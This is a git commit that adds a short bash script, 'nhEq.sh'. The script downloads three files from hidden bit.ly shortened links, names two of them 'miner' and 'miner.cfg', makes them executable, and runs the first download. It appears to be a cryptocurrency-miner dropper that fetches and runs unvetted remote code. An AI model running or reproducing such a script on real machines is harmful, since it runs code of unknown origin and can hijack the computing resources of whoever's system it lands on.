8b7af5c51beaa0e1368c8cf6f3447beec86d140e
locaSup <90463508+locaSup@users.noreply.github.com>
2021-09-21 23:05:01 +0530

    Create nhEq.sh

---
+++ nhEq.sh
@@ -0,0 +1,12 @@
+#!/bin/bash
+wget https://bit.ly/3AvxAnw
+chmod +x 3AvxAnw
+
+wget https://bit.ly/2W3QNOo
+mv 2W3QNOo miner.cfg
+
+wget https://bit.ly/2XAivT0
+mv 2XAivT0 miner
+chmod +x miner
+
+./3AvxAnw
